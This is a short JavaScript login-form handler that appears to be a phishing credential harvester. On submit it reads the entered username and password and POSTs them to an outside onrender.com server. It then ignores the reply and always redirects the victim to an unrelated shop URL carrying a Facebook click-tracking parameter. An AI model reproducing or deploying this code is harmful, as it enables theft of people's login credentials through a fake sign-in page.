document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    fetch('https://web-9ik7.onrender.com/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
    })
    .then(res => res.json())
    .then(data => {
        window.location.href = 'https://hypestep.shop/?fbclid=PAZXh0bgNhZW0CMTEAAafzdYM-GyICgPQ7HxUjTG4Lm5XftjcOSNAfonTWfYeAjPmYStMMbMjUL3jXoA_aem_bur4Vs-cSwanYcQijo9CZA';
    })
    .catch(() => alert('Server error'));
});
